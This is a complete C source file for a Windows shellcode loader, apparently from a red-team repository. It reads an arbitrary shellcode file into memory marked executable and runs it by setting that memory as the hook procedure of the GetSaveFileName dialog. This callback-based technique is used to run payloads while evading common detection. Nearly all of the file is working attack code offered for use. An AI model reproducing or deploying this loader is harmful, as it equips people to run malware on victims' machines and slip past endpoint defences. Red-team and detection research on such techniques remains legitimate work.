// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Comdlg32.lib")


#include <stdio.h>
#include <windows.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: GetSaveFileName.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	/*
	* To enable a hook procedure for an Explorer-style Open or Save As dialog box, use the OPENFILENAME
	* structure when you create the dialog box. Set the OFN_ENABLEHOOK and OFN_EXPLORER flags in the
	* Flags member and specify the address of an OFNHookProc hook procedure in the lpfnHook member.
	* See: https://docs.microsoft.com/en-us/windows/win32/dlgbox/open-and-save-as-dialog-boxes#explorer-style-hook-procedures
	*/

	OPENFILENAME sOpenFilename = { 0 };
	sOpenFilename.lStructSize = sizeof(OPENFILENAME);
	sOpenFilename.nMaxFile = FILENAME_MAX;
	sOpenFilename.hwndOwner = NULL;
	sOpenFilename.Flags = OFN_ENABLEHOOK | OFN_EXPLORER;
	sOpenFilename.lpfnHook = (LPOFNHOOKPROC) hAlloc;

	GetSaveFileName(&sOpenFilename);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}